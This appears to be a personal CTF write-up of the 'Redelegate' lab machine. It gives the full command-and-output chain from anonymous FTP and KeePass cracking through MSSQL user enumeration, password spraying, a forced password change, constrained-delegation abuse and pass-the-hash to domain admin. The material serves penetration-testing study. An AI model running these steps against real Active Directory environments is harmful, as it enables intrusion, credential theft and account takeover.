---
title: Redelegate
date: 2026-01-24
draft: false
ShowToc: true
TocOpen: true
tags:
  - blog
lastmod: 2026-01-24T09:23:32.802Z
---
# Box Info

```
Redelegate is a hard-difficultly Windows machine that starts with Anonymous FTP access, which allows the attacker to download sensitive Keepass Database files. The attacker then discovers that the credentials in the database are valid for MSSQL local login, which leads to enumerate SIDs and performs a password spray attack. Being a member of the `HelpDesk` group, the newly compromised user account `Marie.Curie` has a `User-Force-Change-Password` Access Control setup over the `Helen.Frost` user account; that user account has privileges to get a PS remoting session onto the Domain Controller. The `Helen.Frost` user account also has the `SeEnableDelegationPrivilege` assigned and has full control over the `FS01$` machine account, essentially allowing the attacker account to modify the `msDS-AllowedToDelegateTo` LDAP attribute and change the password of a computer object and perform a Constrained Delegation attack.

Redelegate 是一台困難的 Windows 機器，起始於匿名 FTP 存取，攻擊者可下載敏感的 Keepass 資料庫檔案。攻擊者隨後發現資料庫中的憑證可用於 MSSQL 本地登入，進而列舉 SID，並執行密碼噴射攻擊。作為`客服台`群組成員，新被入侵的使用者帳號 `Marie.Curie` 在 `Helen.Frost` 用戶帳號上設置了使用者`強制更改密碼存取控制（User-Forced Change-Password` Access Control）;該使用者帳號有權限將 PS 遠端連線連線到 Domain Controller。`Helen.Frost` 使用者帳號同時被指派了 `SeEnableDelegationPrivilege`，並完全控制 `FS01$` 機器帳號，實質上允許攻擊者帳號修改 `msDS-AllowedToDelegateTo` LDAP 屬性，並更改電腦物件的密碼，並執行受限委派攻擊。
```

\#FTP #mssqlclient #mssql\_1443 #rustholund-ce #bloodhound #evil-winrm-py #ForceChangePassword #wmiexec #getST #SeEnableDelegationPrivilege #kdbx #keepass #mssqlclient\_username\_brute\_force #mssql\_enum\_domain\_accounts\
\#brute-force #keepass2john

***

# Recon 10.129.234.50

### PORT & IP SCAN

```shell
└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.234.50 -oN serviceScan.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-24 12:27 +0800
Nmap scan report for 10.129.234.50
Host is up (0.12s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  12:11AM                  434 CyberAudit.txt
| 10-20-24  04:14AM                 2622 Shared.kdbx
|_10-20-24  12:26AM                  580 TrainingAgenda.txt
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-24 04:27:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.234.50:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-01-24T04:28:37+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.234.50:1433: 
|     Target_Name: REDELEGATE
|     NetBIOS_Domain_Name: REDELEGATE
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: redelegate.vl
|     DNS_Computer_Name: dc.redelegate.vl
|     DNS_Tree_Name: redelegate.vl
|_    Product_Version: 10.0.20348
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-01-24T03:51:43
|_Not valid after:  2056-01-24T03:51:43
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: REDELEGATE
|   NetBIOS_Domain_Name: REDELEGATE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: redelegate.vl
|   DNS_Computer_Name: dc.redelegate.vl
|   DNS_Tree_Name: redelegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-24T04:28:26+00:00
| ssl-cert: Subject: commonName=dc.redelegate.vl
| Not valid before: 2026-01-23T03:49:07
|_Not valid after:  2026-07-25T03:49:07
|_ssl-date: 2026-01-24T04:28:37+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49361/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49362/tcp open  msrpc         Microsoft Windows RPC
49367/tcp open  msrpc         Microsoft Windows RPC
49378/tcp open  msrpc         Microsoft Windows RPC
49380/tcp open  msrpc         Microsoft Windows RPC
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49932/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-01-24T03:51:43
|_Not valid after:  2056-01-24T03:51:43
| ms-sql-info: 
|   10.129.234.50:49932: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 49932
| ms-sql-ntlm-info: 
|   10.129.234.50:49932: 
|     Target_Name: REDELEGATE
|     NetBIOS_Domain_Name: REDELEGATE
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: redelegate.vl
|     DNS_Computer_Name: dc.redelegate.vl
|     DNS_Tree_Name: redelegate.vl
|_    Product_Version: 10.0.20348
|_ssl-date: 2026-01-24T04:28:37+00:00; 0s from scanner time.
58986/tcp open  msrpc         Microsoft Windows RPC
59161/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-24T04:28:29
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.86 seconds

```

# Shell as SQLGuest

### FTP 21 -- Scans

* [Create Wordlist](/Create%20Wordlist) --> [FTP 21#FTP 爆破登入](FTP%2021#FTP%20%E7%88%86%E7%A0%B4%E7%99%BB%E5%85%A5)

```
└─#  ftp 10.129.234.50
Connected to 10.129.234.50.
220 Microsoft FTP Service
Name (10.129.234.50:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> 
```

It’s important to put FTP into `binary` mode before transferring, or the binary Keepass DB can be messed up. , got the `CyberAudit.txt` , `Shared.kdbx` , `TrainingAgenda.txt`\
![Pasted image 20260124125555.png](/ob/Pasted%20image%2020260124125555.png)

```
binary
```

```└─# cat CyberAudit.txt    
OCTOBER 2024 AUDIT FINDINGS

[!] CyberSecurity Audit findings:

1) Weak User Passwords
2) Excessive Privilege assigned to users
3) Unused Active Directory objects
4) Dangerous Active Directory ACLs

[*] Remediation steps:

1) Prompt users to change their passwords: DONE
2) Check privileges for all users and remove high privileges: DONE
3) Remove unused objects in the domain: IN PROGRESS
4) Recheck ACLs: IN PROGRESS
```

```shell
─# cat TrainingAgenda.txt    
EMPLOYEE CYBER AWARENESS TRAINING AGENDA (OCTOBER 2024)

Friday 4th October  | 14.30 - 16.30 - 53 attendees
"Don't take the bait" - How to better understand phishing emails and what to do when you see one


Friday 11th October | 15.30 - 17.30 - 61 attendees
"Social Media and their dangers" - What happens to what you post online?


Friday 18th October | 11.30 - 13.30 - 7 attendees
"Weak Passwords" - Why "SeasonYear!" is not a good password 


Friday 25th October | 9.30 - 12.30 - 29 attendees
"What now?" - Consequences of a cyber attack and how to mitigate them      
```

### Password deformation

```
└─# cat password 
SeasonYear!
Winter2024!
Spring2024!
Summer2024!
Fall2024!
Autumn2024!

```

### keepass2john

```
┌──(haydon_env)─(root㉿kali)-[~/Desktop]
└─# keepass2john Shared.kdbx | tee Shared.kdbx.hash
                                                                                                      


```

hashcat

```
# hashcat Shared.kdbx.hash password -m 13400 --user
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) Ultra 7 255U, 7928/15857 MB (2048 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 515 MB (13888 MB free)

Dictionary cache built:
* Filename..: password
* Passwords.: 6
* Bytes.....: 70
* Keyspace..: 6
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Hashcat is expecting at least 1008 base words but only got 0.6% of that.
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*806f9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca:Fall2024!
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13400 (KeePass (KDBX v2/v3))
Hash.Target......: $keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8...4502ca
Time.Started.....: Sat Jan 24 13:19:03 2026 (0 secs)
Time.Estimated...: Sat Jan 24 13:19:03 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (password)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:       15 H/s (0.22ms) @ Accel:84 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 6/6 (100.00%)
Rejected.........: 0/6 (0.00%)
Restore.Point....: 0/6 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:599000-600000
Candidate.Engine.: Device Generator
Candidates.#01...: SeasonYear! -> Autumn2024!
Hardware.Mon.#01.: Util: 18%

Started: Sat Jan 24 13:19:01 2026
Stopped: Sat Jan 24 13:19:04 2026

```

got `Fall2024!`

![Pasted image 20260124124334.png](/ob/Pasted%20image%2020260124124334.png)

got the account `SQLGuest:zDPBpaF4FywlqIv11vii`

![Pasted image 20260124170307.png](/ob/Pasted%20image%2020260124170307.png)

### mssqlclient.py

```shell
└─# mssqlclient.py SQLGuest:zDPBpaF4FywlqIv11vii@dc.redelegate.vl
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (SQLGuest  guest@master)> 

```

As an attacker that knows nothing about the environment we’ll need to start by getting the domain name of the SQL Server using the query below.

```
SELECT DEFAULT_DOMAIN() as mydomain;


SQL (SQLGuest  guest@master)> SELECT DEFAULT_DOMAIN() as mydomain;
mydomain     
----------   
REDELEGATE   

```

Next we need to use the “SUSER\_SID” function to get a sample RID from the domain of the SQL Server. You can use any default domain users or group. In the example below I’ve used “Domain Admins”.

```
SQL (SQLGuest  guest@master)> SELECT SUSER_SID('Domain Admins')
                                                              
-----------------------------------------------------------   
b'010500000000000515000000a185deefb22433798d8e847a00020000'   
```

i get nothing form here,eg database run the command  , but https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/#enumda  show that i can enum the users.

# Shell as Marie.Curie

### mssql user enum

Once a full RID has been obtained we can to extract the domain SID by grabbing the first 48 bytes. The domain SID is the unique identifier for the domain and the base of every full RID. After we have the SID we can start building our own RIDs and get fuzzing.

```shell
└─# msfconsole         
Metasploit tip: Network adapter names can be used for IP options set LHOST 
eth0
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v6.4.103-dev                               ]
+ -- --=[ 2,584 exploits - 1,319 auxiliary - 1,697 payloads     ]
+ -- --=[ 434 post - 49 encoders - 14 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > use auxiliary/admin/mssql/mssql_enum_domain_accounts
msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > set rhost 10.129.234.50
rhost => 10.129.234.50
msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > set rport 1433
rport => 1433
msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > set username SQLGuest
username => SQLGuest
msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > set password zDPBpaF4FywlqIv11vii
password => zDPBpaF4FywlqIv11vii
msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > set fuzznum 10000
fuzznum => 10000
msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > run 
[*] Running module against 10.129.234.50
[*] 10.129.234.50:1433 - Attempting to connect to the database server at 10.129.234.50:1433 as SQLGuest...
[+] 10.129.234.50:1433 - Connected.
[*] 10.129.234.50:1433 - SQL Server Name: WIN-Q13O908QBPG
[*] 10.129.234.50:1433 - Domain Name: REDELEGATE
[+] 10.129.234.50:1433 - Found the domain sid: 010500000000000515000000a185deefb22433798d8e847a
[*] 10.129.234.50:1433 - Brute forcing 10000 RIDs through the SQL Server, be patient...
[*] 10.129.234.50:1433 -  - WIN-Q13O908QBPG\Administrator
[*] 10.129.234.50:1433 -  - REDELEGATE\Guest
[*] 10.129.234.50:1433 -  - REDELEGATE\krbtgt
[*] 10.129.234.50:1433 -  - REDELEGATE\Domain Admins
[*] 10.129.234.50:1433 -  - REDELEGATE\Domain Users
[*] 10.129.234.50:1433 -  - REDELEGATE\Domain Guests
[*] 10.129.234.50:1433 -  - REDELEGATE\Domain Computers
[*] 10.129.234.50:1433 -  - REDELEGATE\Domain Controllers
[*] 10.129.234.50:1433 -  - REDELEGATE\Cert Publishers
[*] 10.129.234.50:1433 -  - REDELEGATE\Schema Admins
[*] 10.129.234.50:1433 -  - REDELEGATE\Enterprise Admins
[*] 10.129.234.50:1433 -  - REDELEGATE\Group Policy Creator Owners
[*] 10.129.234.50:1433 -  - REDELEGATE\Read-only Domain Controllers
[*] 10.129.234.50:1433 -  - REDELEGATE\Cloneable Domain Controllers
[*] 10.129.234.50:1433 -  - REDELEGATE\Protected Users
[*] 10.129.234.50:1433 -  - REDELEGATE\Key Admins
[*] 10.129.234.50:1433 -  - REDELEGATE\Enterprise Key Admins
[*] 10.129.234.50:1433 -  - REDELEGATE\RAS and IAS Servers
[*] 10.129.234.50:1433 -  - REDELEGATE\Allowed RODC Password Replication Group
[*] 10.129.234.50:1433 -  - REDELEGATE\Denied RODC Password Replication Group
[*] 10.129.234.50:1433 -  - REDELEGATE\SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG
[*] 10.129.234.50:1433 -  - REDELEGATE\DC$
[*] 10.129.234.50:1433 -  - REDELEGATE\FS01$
[*] 10.129.234.50:1433 -  - REDELEGATE\Christine.Flanders
[*] 10.129.234.50:1433 -  - REDELEGATE\Marie.Curie
[*] 10.129.234.50:1433 -  - REDELEGATE\Helen.Frost
[*] 10.129.234.50:1433 -  - REDELEGATE\Michael.Pontiac
[*] 10.129.234.50:1433 -  - REDELEGATE\Mallory.Roberts
[*] 10.129.234.50:1433 -  - REDELEGATE\James.Dinkleberg
[*] 10.129.234.50:1433 -  - REDELEGATE\Helpdesk
[*] 10.129.234.50:1433 -  - REDELEGATE\IT
[*] 10.129.234.50:1433 -  - REDELEGATE\Finance
[*] 10.129.234.50:1433 -  - REDELEGATE\DnsAdmins
[*] 10.129.234.50:1433 -  - REDELEGATE\DnsUpdateProxy
[*] 10.129.234.50:1433 -  - REDELEGATE\Ryan.Cooper
[*] 10.129.234.50:1433 -  - REDELEGATE\sql_svc

```

The username list

```
└─# cat tmp.txt |  awk -F '\' '{print $2}' 
Administrator
Guest
krbtgt
Domain Admins
Domain Users
Domain Guests
Domain Computers
Domain Controllers
Cert Publishers
Schema Admins
Enterprise Admins
Group Policy Creator Owners
Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
Key Admins
Enterprise Key Admins
RAS and IAS Servers
Allowed RODC Password Replication Group
Denied RODC Password Replication Group
SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG
DC$
FS01$
Christine.Flanders
Marie.Curie
Helen.Frost
Michael.Pontiac
Mallory.Roberts
James.Dinkleberg
Helpdesk
IT
Finance
DnsAdmins
DnsUpdateProxy
Ryan.Cooper
sql_svc
```

### netexec bruteforce continue-on-success

always keep the password list is good thing , if use the password before , the next password enum may be is the same

```
└─# netexec smb dc.redelegate.vl -u username.txt -p password --continue-on-success 
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Administrator:SeasonYear! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Admins:SeasonYear! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Allowed:SeasonYear! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\and:SeasonYear! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Cert:SeasonYear! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Christine.Flanders:SeasonYear! STATUS_LOGON_FAILURE 
```

![Pasted image 20260124141825.png](/ob/Pasted%20image%2020260124141825.png)

The `netexec` show that i can rdp in , but i cant in , so the idea is run the bloodhound directly\
![Pasted image 20260124142212.png](/ob/Pasted%20image%2020260124142212.png)

### rusthound-ce

use the netexec amd bloodhound-python also has the problem to collect the data , so use the rusthound-ce to collect the data

```
https://github.com/g0h4n/RustHound-CE/releases/download/v2.4.7/rusthound-ce-Linux-gnu-x86_64.tar.gz
```

```
tar  -xzvf rusthound-ce-Linux-gnu-x86_64.tar.gz
```

```
./rusthound-ce --domain redelegate.vl -u marie.curie -p 'Fall2024!' --zip
```

# Shell as MARIE.CURLE

### bloodhound

The bloodhound show that MARIE.CURIE show that there are a lot of ForceChangePassword , but only the `HELEN.FORST`  has the outblood dierection

![Pasted image 20260124150308.png](/ob/Pasted%20image%2020260124150308.png)

The map show that the MARIE can attack the `FS01`

![Pasted image 20260124152350.png](/ob/Pasted%20image%2020260124152350.png)

### ForceChangePassword

```shell
└─# netexec smb dc.redelegate.vl -u Marie.Curie -p 'Fall2024!' -M change-password -o USER=helen.frost NEWPASS=Password123
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None)
SMB         10.129.234.50   445    DC               [+] redelegate.vl\Marie.Curie:Fall2024! 
CHANGE-P... 10.129.234.50   445    DC               [+] Successfully changed password for helen.frost
                                                                                                             
```

# Shell as helen.frost

### evil-winrm-py

Load PowerShell functions from local scripts into the interactive shell. 🆕\
Run local PowerShell scripts on the remote host. 🆕\
Load local DLLs (in-memory) as PowerShell modules on the remote host. 🆕\
Upload and execute local EXEs (in-memory) on the remote host. 🆕

```
└─# evil-winrm-py -i dc.redelegate.vl -u helen.frost -p Password123
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'dc.redelegate.vl:5985' as 'helen.frost'
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
evil-winrm-py PS C:\Users\Helen.Frost\Documents> dir
evil-winrm-py PS C:\Users\Helen.Frost\Documents> whoami
redelegate\helen.frost
evil-winrm-py PS C:\Users\Helen.Frost\Documents>

```

### SeEnableDelegationPrivilege (To-be finish)

```
evil-winrm-py PS C:\Users\Helen.Frost\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State  
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled

```

```
evil-winrm-py PS C:\Users\Helen.Frost\Desktop> Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
```

```
evil-winrm-py PS C:\Users\Helen.Frost\Desktop> Set-ADObject -Identity "CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL" -Add @{"msDS-AllowedToDelegateTo"="ldap/dc.rede
legate.vl"}
```

```
netexec smb dc.redelegate.vl -u helen.frost -p Password123 -M change-password -o USER='FS01$' NEWPASS=Password123
```

### getST.py

Impacket’s getST.py will request a Service Ticket and save it as ccache. If the account has constrained delegation privileges, you can use the `-impersonate` flag to request a ticket on behalf of another user. The following command will impersonate the Administrator account and request a Service Ticket on its behalf for the `www` service on host `server01.test.local`.

-spn\
-impersonate

```
└─# getST.py 'redelegate.vl/FS01$:Password123' -spn ldap/dc.redelegate.vl -impersonate dc
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating dc
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user FS01$ or initial TGT not forwardable
                                                                                                 
```

```
getST.py -spn ldap/dc.redelegate.vl 'redelegate.vl/FS01$:Password123'  -dc-ip 10.129.234.50
```

```
export KRB5CCNAME=FS01\$.ccache
```

# Shell as Admin

A similar approach to smbexec but executing commands through WMI. # Main advantage here is it runs under the user (has to be Admin) # account, not SYSTEM, plus, it doesn't generate noisy messages # in the event log that smbexec.py does when creating a service. # Drawback is it needs DCOM, hence, I have to be able to access # DCOM ports at the target machine.

```
wmiexec.py redelegate.vl/administrator@dc.redelegate.vl -hashes :ec17f7a2a4d96e177bfd101b94ffc0a7
```

# learning Goal

https://github.com/aniqfakhrul/powerview.py
